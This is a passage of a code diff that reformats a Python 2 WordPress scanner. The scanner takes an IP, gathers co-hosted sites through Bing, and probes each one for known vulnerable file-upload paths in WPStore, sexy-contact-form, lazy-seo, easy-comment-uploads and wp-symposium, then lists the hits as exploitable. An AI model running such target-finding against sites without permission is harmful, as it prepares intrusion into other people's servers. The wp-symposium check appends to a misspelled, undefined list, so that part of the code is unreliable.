+            if urllib2.urlopen(site + 'wp-login.php').getcode() == 200:
                 wp.append(site)
-        except :
+        except:
             pass
 
     return wp
-def check_wpstorethemeremotefileupload(sites) :
+
+
+def check_wpstorethemeremotefileupload(sites):
     wpstorethemeremotefileupload = []
-    for site in sites :
-        try :
-            if urllib2.urlopen(site+'wp-content/themes/WPStore/upload/index.php').getcode() == 200 :
+    for site in sites:
+        try:
+            if urllib2.urlopen(site + 'wp-content/themes/WPStore/upload/index.php').getcode() == 200:
                 wpstorethemeremotefileupload.append(site)
-        except :
+        except:
             pass
 
     return wpstorethemeremotefileupload
-def check_wpcontactcreativeform(sites) :
+
+
+def check_wpcontactcreativeform(sites):
     wpcontactcreativeform = []
-    for site in sites :
-        try :
-            if urllib2.urlopen(site+'wp-content/plugins/sexy-contact-form/includes/fileupload/index.php').getcode() == 200 :
+    for site in sites:
+        try:
+            if urllib2.urlopen(site + 'wp-content/plugins/sexy-contact-form/includes/fileupload/index.php').getcode() == 200:
                 wpcontactcreativeform.append(site)
-        except :
+        except:
             pass
 
     return wpcontactcreativeform
-def check_wplazyseoplugin(sites) :
+
+
+def check_wplazyseoplugin(sites):
     wplazyseoplugin = []
-    for site in sites :
-        try :
-            if urllib2.urlopen(site+'wp-content/plugins/lazy-seo/lazyseo.php').getcode() == 200 :
+    for site in sites:
+        try:
+            if urllib2.urlopen(site + 'wp-content/plugins/lazy-seo/lazyseo.php').getcode() == 200:
                 wplazyseoplugin.append(site)
-        except :
+        except:
             pass
 
     return wplazyseoplugin
-def check_wpeasyupload(sites) :
+
+
+def check_wpeasyupload(sites):
     wpeasyupload = []
-    for site in sites :
-        try :
-            if urllib2.urlopen(site+'wp-content/plugins/easy-comment-uploads/upload-form.php').getcode() == 200 :
+    for site in sites:
+        try:
+            if urllib2.urlopen(site + 'wp-content/plugins/easy-comment-uploads/upload-form.php').getcode() == 200:
                 wpeasyupload.append(site)
-        except :
+        except:
             pass
 
     return wpeasyupload
-def check_wpsymposium(sites) :
+
+
+def check_wpsymposium(sites):
     wpsymposium = []
-    for site in sites :
-        try :
-            if urllib2.urlopen(site+'wp-symposium/server/file_upload_form.php').getcode() == 200 :
+    for site in sites:
+        try:
+            if urllib2.urlopen(site + 'wp-symposium/server/file_upload_form.php').getcode() == 200:
                 wpsycmium.append(site)
-        except :
+        except:
             pass
 
     return wpsymposium
+
+
 def wpminiscanner():
     ip = raw_input('Enter IP -> ')
     sites = bing_all_grabber(str(ip))
@@ -1540,34 +1806,34 @@ def wpminiscanner():
     wplazyseoplugin = check_wplazyseoplugin(sites)
     wpeasyupload = check_wpeasyupload(sites)
     wpsymposium = check_wpsymposium(sites)
-    for ss in wordpress :
+    for ss in wordpress:
         print ss
     print '[*] Found, ', len(wordpress), ' wordpress sites.'
-    print '-'*30+'\n'
-    for ss in wpstorethemeremotefileupload  :
+    print '-' * 30 + '\n'
+    for ss in wpstorethemeremotefileupload:
         print ss
     print '[*] Found, ', len(wpstorethemeremotefileupload), ' wp_storethemeremotefileupload exploit.'
-    print '-'*30+'\n'
-    for ss in wpcontactcreativeform  :
+    print '-' * 30 + '\n'
+    for ss in wpcontactcreativeform:
         print ss
     print '[*] Found, ', len(wpcontactcreativeform), ' wp_contactcreativeform exploit.'
-    print '-'*30+'\n'
-    for ss in wplazyseoplugin  :
+    print '-' * 30 + '\n'
+    for ss in wplazyseoplugin:
         print ss
     print '[*] Found, ', len(wplazyseoplugin), ' wp_lazyseoplugin exploit.'
-    print '-'*30+'\n'
-    for ss in wpeasyupload  :
+    print '-' * 30 + '\n'
+    for ss in wpeasyupload:
         print ss
     print '[*] Found, ', len(wpeasyupload), ' wp_easyupload exploit.'
-    print '-'*30+'\n'
-    for ss in wpsymposium :
+    print '-' * 30 + '\n'
+    for ss in wpsymposium:
         print ss
-
 
     print '[*] Found, ', len(wpsymposium), ' wp_sympsiup exploit.'
 
     print '\n'
 ############################
 
+
 if __name__ == "__main__":
-  menu()
+    menu()
